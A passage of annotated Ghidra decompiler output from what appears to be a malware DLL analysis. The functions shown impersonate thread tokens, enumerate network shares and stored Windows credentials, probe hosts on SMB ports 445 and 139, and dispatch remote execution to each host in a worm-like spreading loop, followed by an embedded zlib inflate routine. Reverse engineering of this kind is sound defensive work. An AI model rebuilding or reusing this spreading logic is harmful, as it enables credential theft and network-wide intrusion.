    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,lpMem);
  }
  return local_10;
}



/*
 * RECONSTRUCTED FUNCTION: WorkItemForwarder_10009EA4
 * Ghidra symbol: FUN_10009ea4 | VA: 0x10009EA4 | original source line: 9185
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: RemoteExecutionCoordinator_10009987
 */
undefined4 WorkItemForwarder_10009EA4(uint *param_1)

{
  uint uVar1;
  
  uVar1 = RemoteExecutionCoordinator_10009987(param_1[1],(LPCWSTR)param_1[2],(LPCWSTR)param_1[3],(DWORD *)0x0);
  *param_1 = uVar1;
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: SpawnWorkItemThread_10009EC7
 * Ghidra symbol: FUN_10009ec7 | VA: 0x10009EC7 | original source line: 9197
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateThread, GetLastError
 * Direct function references: NetworkWorkerQueueCallback_10006F78, AllocateNetworkWorkItem_1000711F, SelectNextNetworkWorkItem_10007167, WorkItemForwarder_10009EA4
 */
int SpawnWorkItemThread_10009EC7(undefined4 param_1)

{
  HANDLE Token;
  BOOL BVar1;
  DWORD DVar2;
  int iVar3;
  int iVar4;
  int local_20;
  undefined4 local_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 *local_10;
  undefined4 *local_c;
  HANDLE local_8;
  
  iVar4 = 0;
  local_c = (undefined4 *)0x0;
  local_10 = AllocateNetworkWorkItem_1000711F(0,(int *)&local_c);
  if (local_10 != (undefined4 *)0x0) {
    do {
      Token = *(HANDLE *)*local_c;
      local_20 = 0;
      uStack_18 = 0;
      uStack_14 = 0;
      local_1c = param_1;
      local_8 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,WorkItemForwarder_10009EA4,&local_20,4,(LPDWORD)0x0);
      if (local_8 != (HANDLE)0x0) {
        BVar1 = SetThreadToken(&local_8,Token);
        if (BVar1 != 0) {
          DVar2 = ResumeThread(local_8);
          if (DVar2 == 0xffffffff) {
            GetLastError();
          }
          else {
            WaitForSingleObject(local_8,0xffffffff);
          }
        }
        CloseHandle(local_8);
      }
      iVar4 = local_20;
    } while ((local_20 == 0) && (iVar3 = SelectNextNetworkWorkItem_10007167((int *)&local_c), iVar3 != 0));
    NetworkWorkerQueueCallback_10006F78(local_10);
  }
  return iVar4;
}



/*
 * RECONSTRUCTED FUNCTION: ImpersonatedNetworkWorker_10009F8E
 * Ghidra symbol: FUN_10009f8e | VA: 0x10009F8E | original source line: 9246
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetCurrentThread
 * Direct function references: FetchNextNetworkWorkItem_10006F02, CopyAndDispatchNetworkItem_10006F40, NetworkWorkerQueueCallback_10006F78, NetworkWorkerQueueCallbackAlternate_10006F91, CreateWorkerQueue_10007091, SynchronizeWorkerThreads_100070FA, EnumerateNetworkResourcesRecursively_10007A17, EnumerateStoredWindowsCredentials_10007B31, RemoteExecutionCoordinator_10009987
 */
undefined4 ImpersonatedNetworkWorker_10009F8E(void)

{
  bool bVar1;
  HANDLE ThreadHandle;
  LPCRITICAL_SECTION p_Var2;
  LPVOID pvVar3;
  uint uVar4;
  undefined3 extraout_var;
  DWORD DesiredAccess;
  BOOL BVar5;
  HANDLE *TokenHandle;
  short local_30 [16];
  undefined4 local_10;
  HANDLE local_c;
  HANDLE local_8;
  
  TokenHandle = &local_8;
  BVar5 = 1;
  DesiredAccess = 0xb;
  local_8 = (HANDLE)0x0;
  local_c = (HANDLE)0x0;
  ThreadHandle = GetCurrentThread();
  BVar5 = OpenThreadToken(ThreadHandle,DesiredAccess,BVar5,TokenHandle);
  if (BVar5 != 0) {
    DuplicateTokenEx(local_8,0x2000000,(LPSECURITY_ATTRIBUTES)0x0,SecurityImpersonation,
                     TokenImpersonation,&local_c);
  }
  local_10 = DAT_1001f140;
  p_Var2 = CreateWorkerQueue_10007091(0x24,0x10006eda,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
  EnumerateNetworkResourcesRecursively_10007A17(p_Var2,(LPNETRESOURCEW)0x0);
  EnumerateStoredWindowsCredentials_10007B31(p_Var2);
  SynchronizeWorkerThreads_100070FA();
  pvVar3 = (LPVOID)CopyAndDispatchNetworkItem_10006F40(local_30);
  if (pvVar3 != (LPVOID)0x0) {
    do {
      uVar4 = RemoteExecutionCoordinator_10009987((int)local_30,(LPCWSTR)0x0,(LPCWSTR)0x0,(DWORD *)0x0);
      if (uVar4 != 0) {
        NetworkWorkerQueueCallbackAlternate_10006F91(local_30);
        NetworkWorkerQueueCallbackAlternate_10006F91(local_30);
      }
      local_30[0] = 0;
      bVar1 = FetchNextNetworkWorkItem_10006F02(local_30);
    } while (CONCAT31(extraout_var,bVar1) != 0);
    NetworkWorkerQueueCallback_10006F78(pvVar3);
  }
  if (local_8 != (HANDLE)0x0) {
    CloseHandle(local_8);
    local_8 = (HANDLE)0x0;
  }
  if (local_c != (HANDLE)0x0) {
    CloseHandle(local_c);
  }
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: RunNetworkWorker_1000A073
 * Ghidra symbol: FUN_1000a073 | VA: 0x1000A073 | original source line: 9304
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: NetworkWorkerQueueCallbackAlternate_10006F91, RemoteExecutionCoordinator_10009987, ExecuteWorkItem_10009E05, SpawnWorkItemThread_10009EC7
 */
undefined4 RunNetworkWorker_1000A073(int *param_1)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  HANDLE pvVar4;
  DWORD DVar5;
  short *lpMem;
  
  iVar3 = DAT_1001f110;
  if (param_1 == (int *)0x0) {
    return 0;
  }
  iVar1 = *param_1;
  lpMem = (short *)param_1[1];
  if ((((DAT_1001f108 != 0) && (uVar2 = ExecuteWorkItem_10009E05((int)lpMem), uVar2 != 0)) ||
      ((iVar3 != 0 && (iVar3 = SpawnWorkItemThread_10009EC7(lpMem), iVar3 != 0)))) ||
     ((iVar1 != 0 &&
      (uVar2 = RemoteExecutionCoordinator_10009987((int)lpMem,(LPCWSTR)0x0,(LPCWSTR)0x0,(DWORD *)0x0), uVar2 != 0)))) {
    NetworkWorkerQueueCallbackAlternate_10006F91(lpMem);
  }
  DVar5 = 0;
  pvVar4 = GetProcessHeap();
  HeapFree(pvVar4,DVar5,lpMem);
  DVar5 = 0;
  pvVar4 = GetProcessHeap();
  HeapFree(pvVar4,DVar5,param_1);
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: NetworkWorkerScheduler_1000A0FE
 * Ghidra symbol: FUN_1000a0fe | VA: 0x1000A0FE | original source line: 9337
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetProcessHeap, CreateThread
 * Direct function references: FetchNextNetworkWorkItem_10006F02, CopyAndDispatchNetworkItem_10006F40, NetworkWorkerQueueCallback_10006F78, ImpersonatedNetworkWorker_10009F8E, RunNetworkWorker_1000A073
 */
undefined4 NetworkWorkerScheduler_1000A0FE(void)

{
  bool bVar1;
  HANDLE pvVar2;
  uint *lpParameter;
  short *psVar3;
  int iVar4;
  undefined4 uVar5;
  undefined3 extraout_var;
  code *pcVar6;
  code *pcVar7;
  DWORD DVar8;
  SIZE_T SVar9;
  HANDLE local_2c [5];
  undefined4 local_18;
  uint local_14;
  DWORD local_10;
  DWORD local_c;
  DWORD local_8;
  
  local_18 = DAT_1001f140;
  local_14 = ~(g_privilege_and_execution_flags >> 2) & 1;
  if (local_14 != 0) {
    ImpersonatedNetworkWorker_10009F8E();
  }
  pcVar6 = GetProcessHeap_exref;
  local_2c[0] = (HANDLE)0x0;
  local_2c[1] = (HANDLE)0x0;
  local_2c[2] = (HANDLE)0x0;
  SVar9 = 8;
  DVar8 = 8;
  local_2c[3] = (HANDLE)0x0;
  pvVar2 = GetProcessHeap();
  pcVar7 = HeapAlloc_exref;
  lpParameter = HeapAlloc(pvVar2,DVar8,SVar9);
  if (lpParameter != (uint *)0x0) {
    SVar9 = 0x21;
    DVar8 = 8;
    *lpParameter = local_14;
    pvVar2 = GetProcessHeap();
    psVar3 = HeapAlloc(pvVar2,DVar8,SVar9);
    lpParameter[1] = (uint)psVar3;
    if (psVar3 != (short *)0x0) {
      local_2c[4] = (HANDLE)CopyAndDispatchNetworkItem_10006F40(psVar3);
      if (local_2c[4] != (LPVOID)0x0) {
        local_8 = 0;
        local_10 = 0;
        do {
          local_c = 0;
          if (local_8 == 4) {
            local_10 = 0xffffffff;
          }
          else {
            pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,RunNetworkWorker_1000A073,lpParameter,0,
                                  (LPDWORD)0x0);
            if (pvVar2 == (HANDLE)0x0) {
LAB_1000a263:
              NetworkWorkerQueueCallback_10006F78(local_2c[4]);
              return 0;
            }
            local_2c[local_8] = pvVar2;
          }
          iVar4 = 0;
          do {
            if (local_2c[iVar4] == (HANDLE)0x0) break;
            local_c = local_c + 1;
            iVar4 = iVar4 + 1;
          } while (iVar4 != 4);
          DVar8 = WaitForMultipleObjects(local_c,local_2c,0,local_10);
          if (DVar8 == 0xffffffff) goto LAB_1000a263;
          if (DVar8 == 0x102) {
            local_8 = 4;
            DVar8 = 0;
            do {
              if (local_2c[DVar8] == (HANDLE)0x0) {
                local_8 = DVar8;
                break;
              }
              DVar8 = DVar8 + 1;
            } while (DVar8 != 4);
          }
          else if (DVar8 <= local_c - 1) {
            local_8 = DVar8;
            CloseHandle(local_2c[DVar8]);
            local_2c[DVar8] = (HANDLE)0x0;
          }
          uVar5 = (*pcVar6)(8,8);
          lpParameter = (uint *)(*pcVar7)(uVar5);
          if (lpParameter == (uint *)0x0) goto LAB_1000a263;
          uVar5 = (*pcVar6)(8,0x21);
          psVar3 = (short *)(*pcVar7)(uVar5);
          lpParameter[1] = (uint)psVar3;
          *lpParameter = local_14;
          if ((psVar3 == (short *)0x0) ||
             (bVar1 = FetchNextNetworkWorkItem_10006F02(psVar3), CONCAT31(extraout_var,bVar1) == 0)) goto LAB_1000a263;
          pcVar6 = GetProcessHeap_exref;
          pcVar7 = HeapAlloc_exref;
        } while( true );
      }
    }
  }
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: DeferredNetworkWorker_1000A274
 * Ghidra symbol: FUN_1000a274 | VA: 0x1000A274 | original source line: 9444
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: FetchNextNetworkWorkItem_10006F02, CopyAndDispatchNetworkItem_10006F40, NetworkWorkerQueueCallback_10006F78, NetworkWorkerQueueCallbackAlternate_10006F91, PrepareRemoteWorkItem_10009DC3
 */
undefined4 DeferredNetworkWorker_1000A274(DWORD *param_1)

{
  bool bVar1;
  LPVOID pvVar2;
  int iVar3;
  undefined3 extraout_var;
  HANDLE hHeap;
  DWORD dwFlags;
  WCHAR local_24 [16];
  
  Sleep(*param_1);
  pvVar2 = (LPVOID)CopyAndDispatchNetworkItem_10006F40(local_24);
  if (pvVar2 != (LPVOID)0x0) {
    do {
      iVar3 = PrepareRemoteWorkItem_10009DC3(local_24);
      if (iVar3 != 0) {
        NetworkWorkerQueueCallbackAlternate_10006F91(local_24);
      }
      local_24[0] = L'\0';
      bVar1 = FetchNextNetworkWorkItem_10006F02(local_24);
    } while (CONCAT31(extraout_var,bVar1) != 0);
    NetworkWorkerQueueCallback_10006F78(pvVar2);
  }
  dwFlags = 0;
  hHeap = GetProcessHeap();
  HeapFree(hHeap,dwFlags,param_1);
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: ProbeRemoteServiceResponse_1000A2E8
 * Ghidra symbol: FUN_1000a2e8 | VA: 0x1000A2E8 | original source line: 9476
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: Ordinal_23, Ordinal_9, Ordinal_10, Ordinal_4, Ordinal_18, Ordinal_151, Ordinal_3
 * Direct function references: none mapped
 */
undefined4 ProbeRemoteServiceResponse_1000A2E8(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  undefined4 local_12c;
  int local_128 [65];
  undefined2 local_24;
  undefined2 local_22;
  undefined4 local_20;
  undefined2 uStack_1c;
  undefined4 uStack_1a;
  undefined2 uStack_16;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  local_24 = 0;
  local_22 = 0;
  local_20._0_2_ = 0;
  local_20._2_2_ = 0;
  uStack_1c = 0;
  uStack_1a = 0;
  uStack_16 = 0;
  local_12c = 0;
  memset(local_128,0,0x100);
  local_10 = 0;
  local_c = 0;
  local_14 = 1;
  local_8 = 0;
  iVar1 = Ordinal_23(2,1,0);
  if (iVar1 != 0) {
    local_24 = 2;
    local_20 = param_1;
    local_22 = Ordinal_9(param_2);
    iVar2 = Ordinal_10(iVar1,0x8004667e,&local_14);
    if (iVar2 != -1) {
      Ordinal_4(iVar1,&local_24,0x10);
      local_12c = 1;
      local_10 = 2;
      local_c = 0;
      local_128[0] = iVar1;
      iVar2 = Ordinal_18(iVar1 + 1,0,&local_12c,0,&local_10);
      if (iVar2 != -1) {
        iVar2 = Ordinal_151(iVar1,&local_12c);
        if (iVar2 != 0) {
          local_8 = 1;
        }
      }
    }
    Ordinal_3(iVar1);
  }
  return local_8;
}



/*
 * RECONSTRUCTED FUNCTION: ClassifyRemoteServiceResponse_1000A3D9
 * Ghidra symbol: FUN_1000a3d9 | VA: 0x1000A3D9 | original source line: 9534
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: ProbeRemoteServiceResponse_1000A2E8
 */
undefined4 ClassifyRemoteServiceResponse_1000A3D9(undefined4 param_1)

{
  int iVar1;
  
  iVar1 = ProbeRemoteServiceResponse_1000A2E8(param_1,0x1bd);
  if ((iVar1 == 0) && (iVar1 = ProbeRemoteServiceResponse_1000A2E8(param_1,0x8b), iVar1 == 0)) {
    return 0;
  }
  return 1;
}



void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x1000a40c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}



void __cdecl free(void *_Memory)

{
                    // WARNING: Could not recover jumptable at 0x1000a4d2. Too many branches
                    // WARNING: Treating indirect jump as call
  free(_Memory);
  return;
}



void * __cdecl malloc(size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x1000a4d8. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = malloc(_Size);
  return pvVar1;
}



char * __cdecl _itoa(int _Value,char *_Dest,int _Radix)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x1000a4de. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = _itoa(_Value,_Dest,_Radix);
  return pcVar1;
}



void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x1000a4e4. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



// WARNING: This is an inlined function

void __alloca_probe(void)

{
  undefined1 *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined1 local_res0;
  undefined1 auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&local_res0 - (int)in_EAX & ~-(uint)(&local_res0 < in_EAX));
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = _local_res0;
  return;
}



/*
 * RECONSTRUCTED FUNCTION: InflateResourceBuffer_1000A520
 * Ghidra symbol: FUN_1000a520 | VA: 0x1000A520 | original source line: 9632
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: EmbeddedZlibInflateEngine_1000A5CC, EmbeddedZlibBufferSupport_1000BA60, EmbeddedZlibFrontend_1000BB31
 */
int InflateResourceBuffer_1000A520(undefined4 param_1,undefined4 *param_2,int param_3,int param_4)

{
  int iVar1;
  int local_3c;
  int local_38;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_1c;
  undefined4 local_18;
  
  local_1c = 0;
  local_18 = 0;
  local_3c = param_3;
  local_38 = param_4;
  local_30 = param_1;
  local_2c = *param_2;
  iVar1 = EmbeddedZlibFrontend_1000BB31((int)&local_3c,"1.2.8",0x38);
  if (iVar1 == 0) {
    iVar1 = EmbeddedZlibInflateEngine_1000A5CC(&local_3c,4);
    if (iVar1 == 1) {
      *param_2 = local_28;
      iVar1 = EmbeddedZlibBufferSupport_1000BA60((int)&local_3c);
    }
    else {
      EmbeddedZlibBufferSupport_1000BA60((int)&local_3c);
      if ((iVar1 == 2) || ((iVar1 == -5 && (local_38 == 0)))) {
        iVar1 = -3;
      }
    }
  }
  return iVar1;
}



/*
 * RECONSTRUCTED FUNCTION: InflateBufferHelper_1000A5A8
 * Ghidra symbol: FUN_1000a5a8 | VA: 0x1000A5A8 | original source line: 9669
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
void __cdecl InflateBufferHelper_1000A5A8(int param_1)

{
  *(undefined **)(param_1 + 0x4c) = &DAT_1000d2d0;
  *(undefined4 *)(param_1 + 0x54) = 9;
  *(undefined **)(param_1 + 0x50) = &DAT_1000dad0;
  *(undefined4 *)(param_1 + 0x58) = 5;
  return;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibInflateEngine_1000A5CC
 * Ghidra symbol: FUN_1000a5cc | VA: 0x1000A5CC | original source line: 9681
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: InflateBufferHelper_1000A5A8, EmbeddedZlibBlockDecoder_1000BC5B, EmbeddedZlibHuffmanDecoder_1000BD21, EmbeddedZlibHuffmanHelper_1000BF51, ZlibRuntimeTableHelperA_1000C244, ZlibRuntimeTableHelperB_1000C6D0
 */
int EmbeddedZlibInflateEngine_1000A5CC(int *param_1,int param_2)

{
  undefined2 uVar1;
  uint *puVar2;
  uint uVar3;
  char cVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  uint uVar9;
  uint uVar10;
  ushort uVar11;
  size_t _Size;
  uint extraout_EDX;
  int iVar12;
  uint uVar13;
  uint uVar14;
  int local_38;
  uint local_2c;
  int local_24;
  undefined1 *local_20;
  uint local_1c;
  char local_18;
  undefined1 local_17;
  undefined1 local_16;
  undefined1 local_15;
  uint local_14;
  uint local_10;
  uint *local_c;
  uint local_8;
  
  if ((((param_1 != (int *)0x0) && (puVar2 = (uint *)param_1[7], puVar2 != (uint *)0x0)) &&
      (param_1[3] != 0)) && ((*param_1 != 0 || (param_1[1] == 0)))) {
    if (*puVar2 == 0xb) {
      *puVar2 = 0xc;
    }
    local_20 = (undefined1 *)param_1[3];
    uVar6 = puVar2[0xe];
    uVar14 = puVar2[0xf];
    local_2c = param_1[4];
    local_c = (uint *)*param_1;
    uVar3 = param_1[1];
    local_24 = 0;
    uVar9 = *puVar2;
    if (uVar9 < 0x1f) {
      uVar10 = uVar3;
      local_1c = local_2c;
      local_14 = uVar14;
      local_10 = uVar6;
      local_8 = uVar3;
      do {
        uVar13 = uVar14;
        switch((&switchD_1000a64e::switchdataD_1000b9e4)[uVar9]) {
        case (undefined *)0x1000a655:
          if (puVar2[2] != 0) {
            if (uVar14 < 0x10) {
              do {
                if (uVar10 == 0) goto LAB_1000b8df;
                uVar10 = uVar10 - 1;
                uVar13 = uVar14 + 8;
                uVar6 = uVar6 + ((uint)(byte)*local_c << ((byte)uVar14 & 0x1f));
                local_c = (uint *)((int)local_c + 1);
                uVar14 = uVar13;
                local_14 = uVar13;
                local_10 = uVar6;
                local_8 = uVar10;
              } while (uVar13 < 0x10);
            }
            if (((puVar2[2] & 2) == 0) || (uVar6 != 0x8b1f)) {
              puVar2[4] = 0;
              if (puVar2[8] != 0) {
                *(undefined4 *)(puVar2[8] + 0x30) = 0xffffffff;
              }
              uVar9 = uVar6;
              if (((puVar2[2] & 1) != 0) &&
                 (uVar9 = local_10, ((uVar6 >> 8) + (uVar6 & 0xff) * 0x100) % 0x1f == 0)) {
                if (((byte)local_10 & 0xf) != 8) {
                  param_1[6] = (int)"unknown compression method";
                  goto LAB_1000a729;
                }
                uVar9 = local_10 >> 4;
                uVar13 = uVar13 - 4;
                uVar6 = (uVar9 & 0xf) + 8;
                local_14 = uVar13;
                local_10 = uVar9;
                if (puVar2[9] == 0) {
                  puVar2[9] = uVar6;
                }
                else if (puVar2[9] < uVar6) {
                  param_1[6] = (int)"invalid window size";
                  goto LAB_1000a729;
                }
                uVar14 = 0;
                puVar2[5] = 1 << (sbyte)uVar6;
                uVar6 = EmbeddedZlibHuffmanDecoder_1000BD21(0,(byte *)0x0,0);
                puVar2[6] = uVar6;
                param_1[0xc] = uVar6;
                *puVar2 = ~(local_10 >> 8) & 2 | 9;
                uVar6 = 0;
                goto LAB_1000a77b;
              }
              param_1[6] = (int)"incorrect header check";
              goto LAB_1000a729;
            }
            uVar14 = 0;
            uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(0,(uint *)0x0,0);
            puVar2[6] = uVar6;
            local_18 = '\x1f';
            local_17 = 0x8b;
            uVar9 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],(uint *)&local_18,2);
            uVar6 = 0;
            puVar2[6] = uVar9;
            local_10 = 0;
            local_14 = 0;
            *puVar2 = 1;
            goto LAB_1000ac52;
          }
          *puVar2 = 0xc;
          goto LAB_1000ac55;
        case (undefined *)0x1000a79d:
          if (uVar14 < 0x10) {
            do {
              if (uVar10 == 0) goto LAB_1000b8df;
              uVar10 = uVar10 - 1;
              bVar8 = (byte)uVar14;
              uVar14 = uVar14 + 8;
              uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              local_14 = uVar14;
              local_10 = uVar6;
              local_8 = uVar10;
            } while (uVar14 < 0x10);
          }
          puVar2[4] = uVar6;
          if ((char)uVar6 == '\b') {
            if ((uVar6 & 0xe000) == 0) {
              if ((uint *)puVar2[8] != (uint *)0x0) {
                *(uint *)puVar2[8] = uVar6 >> 8 & 1;
              }
              if ((puVar2[4] & 0x200) != 0) {
                local_17 = (undefined1)(uVar6 >> 8);
                local_18 = (char)uVar6;
                uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],(uint *)&local_18,2);
                puVar2[6] = uVar6;
              }
              uVar6 = 0;
              *puVar2 = 2;
              local_10 = 0;
              uVar14 = 0;
              uVar10 = local_8;
              goto switchD_1000a64e_caseD_1000a845;
            }
            param_1[6] = (int)"unknown header flags set";
          }
          else {
            param_1[6] = (int)"unknown compression method";
          }
          break;
        case (undefined *)0x1000a845:
switchD_1000a64e_caseD_1000a845:
          if (uVar14 < 0x20) {
            do {
              if (uVar10 == 0) goto LAB_1000b8df;
              uVar10 = uVar10 - 1;
              bVar8 = (byte)uVar14;
              uVar14 = uVar14 + 8;
              uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              local_10 = uVar6;
              local_8 = uVar10;
            } while (uVar14 < 0x20);
          }
          if (puVar2[8] != 0) {
            *(uint *)(puVar2[8] + 4) = uVar6;
          }
          if ((puVar2[4] & 0x200) != 0) {
            local_18 = (char)uVar6;
            local_17 = (undefined1)(uVar6 >> 8);
            local_16 = (undefined1)(uVar6 >> 0x10);
            local_15 = (undefined1)(uVar6 >> 0x18);
            uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],(uint *)&local_18,4);
            puVar2[6] = uVar6;
          }
          uVar6 = 0;
          *puVar2 = 3;
          local_10 = 0;
          uVar14 = 0;
          uVar10 = local_8;
        case (undefined *)0x1000a8c6:
          if (uVar14 < 0x10) {
            do {
              if (uVar10 == 0) goto LAB_1000b8df;
              uVar10 = uVar10 - 1;
              bVar8 = (byte)uVar14;
              uVar14 = uVar14 + 8;
              uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              local_10 = uVar6;
              local_8 = uVar10;
            } while (uVar14 < 0x10);
          }
          if (puVar2[8] != 0) {
            *(uint *)(puVar2[8] + 8) = uVar6 & 0xff;
            *(uint *)(puVar2[8] + 0xc) = uVar6 >> 8;
          }
          if ((puVar2[4] & 0x200) != 0) {
            local_18 = (char)uVar6;
            local_17 = (undefined1)(uVar6 >> 8);
            uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],(uint *)&local_18,2);
            puVar2[6] = uVar6;
          }
          uVar6 = 0;
          *puVar2 = 4;
          uVar14 = 0;
          local_10 = 0;
          local_14 = 0;
          uVar10 = local_8;
switchD_1000a64e_caseD_1000a94a:
          if ((puVar2[4] & 0x400) == 0) {
            if (puVar2[8] != 0) {
              *(undefined4 *)(puVar2[8] + 0x10) = 0;
            }
          }
          else {
            if (uVar14 < 0x10) {
              do {
                if (uVar10 == 0) goto LAB_1000b8df;
                uVar10 = uVar10 - 1;
                bVar8 = (byte)uVar14;
                uVar14 = uVar14 + 8;
                uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
                local_c = (uint *)((int)local_c + 1);
                local_10 = uVar6;
                local_8 = uVar10;
              } while (uVar14 < 0x10);
            }
            puVar2[0x10] = uVar6;
            if (puVar2[8] != 0) {
              *(uint *)(puVar2[8] + 0x14) = uVar6;
            }
            if ((puVar2[4] & 0x200) != 0) {
              local_18 = (char)uVar6;
              local_17 = (undefined1)(uVar6 >> 8);
              uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],(uint *)&local_18,2);
              puVar2[6] = uVar6;
            }
            uVar14 = 0;
            local_10 = 0;
            local_14 = 0;
          }
          *puVar2 = 5;
switchD_1000a64e_caseD_1000a9d4:
          if ((puVar2[4] & 0x400) != 0) {
            uVar6 = puVar2[0x10];
            if (local_8 < puVar2[0x10]) {
              uVar6 = local_8;
            }
            if (uVar6 != 0) {
              uVar9 = puVar2[8];
              if ((uVar9 != 0) && (*(int *)(uVar9 + 0x10) != 0)) {
                iVar5 = *(int *)(uVar9 + 0x14) - puVar2[0x10];
                if (*(uint *)(uVar9 + 0x18) < iVar5 + uVar6) {
                  _Size = *(uint *)(uVar9 + 0x18) - iVar5;
                }
                else {
                  _Size = uVar6;
                }
                memcpy((void *)(iVar5 + *(int *)(uVar9 + 0x10)),local_c,_Size);
              }
              if ((puVar2[4] & 0x200) != 0) {
                uVar9 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],local_c,uVar6);
                puVar2[6] = uVar9;
              }
              local_8 = local_8 - uVar6;
              local_c = (uint *)((int)local_c + uVar6);
              puVar2[0x10] = puVar2[0x10] - uVar6;
            }
            if (puVar2[0x10] == 0) goto LAB_1000aa66;
LAB_1000b8df:
LAB_1000b8e2:
            param_1[3] = (int)local_20;
            param_1[4] = local_1c;
            *param_1 = (int)local_c;
            param_1[1] = local_8;
            puVar2[0xf] = uVar14;
            puVar2[0xe] = local_10;
            if (((puVar2[10] == 0) &&
                (((local_2c == param_1[4] || (0x1c < (int)*puVar2)) ||
                 ((0x19 < (int)*puVar2 && (param_2 == 4)))))) ||
               (iVar5 = EmbeddedZlibBlockDecoder_1000BC5B((int)param_1,param_1[3],local_2c - param_1[4]), iVar5 == 0)) {
              iVar5 = param_1[1];
              local_2c = local_2c - param_1[4];
              param_1[2] = param_1[2] + (uVar3 - iVar5);
              param_1[5] = param_1[5] + local_2c;
              puVar2[7] = puVar2[7] + local_2c;
              if ((puVar2[2] != 0) && (local_2c != 0)) {
                if (puVar2[4] == 0) {
                  uVar6 = EmbeddedZlibHuffmanDecoder_1000BD21(puVar2[6],(byte *)(param_1[3] - local_2c),local_2c);
                }
                else {
                  uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],(uint *)(param_1[3] - local_2c),local_2c);
                }
                puVar2[6] = uVar6;
                param_1[0xc] = uVar6;
              }
              iVar12 = 0;
              if ((*puVar2 == 0x13) || (*puVar2 == 0xe)) {
                iVar12 = 0x100;
              }
              iVar7 = 0;
              if (*puVar2 == 0xb) {
                iVar7 = 0x80;
              }
              param_1[0xb] = iVar7 + (-(uint)(puVar2[1] != 0) & 0x40) + iVar12 + puVar2[0xf];
              if (((uVar3 - iVar5 != 0) || (local_2c != 0)) && (param_2 != 4)) {
                return local_24;
              }
              if (local_24 == 0) {
                return -5;
              }
              return local_24;
            }
            *puVar2 = 0x1e;
LAB_1000ac63:
            return -4;
          }
LAB_1000aa66:
          puVar2[0x10] = 0;
          *puVar2 = 6;
          uVar10 = local_8;
LAB_1000aa76:
          if ((puVar2[4] & 0x800) != 0) {
            if (uVar10 != 0) {
              uVar10 = 0;
              do {
                cVar4 = *(char *)(uVar10 + (int)local_c);
                uVar10 = uVar10 + 1;
                uVar6 = puVar2[8];
                if (((uVar6 != 0) && (*(int *)(uVar6 + 0x1c) != 0)) &&
                   (puVar2[0x10] < *(uint *)(uVar6 + 0x20))) {
                  *(char *)(*(int *)(uVar6 + 0x1c) + puVar2[0x10]) = cVar4;
                  puVar2[0x10] = puVar2[0x10] + 1;
                }
              } while ((cVar4 != '\0') && (uVar10 < local_8));
              if ((puVar2[4] & 0x200) != 0) {
                uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],local_c,uVar10);
                puVar2[6] = uVar6;
              }
              local_c = (uint *)((int)local_c + uVar10);
              uVar10 = local_8 - uVar10;
              local_8 = uVar10;
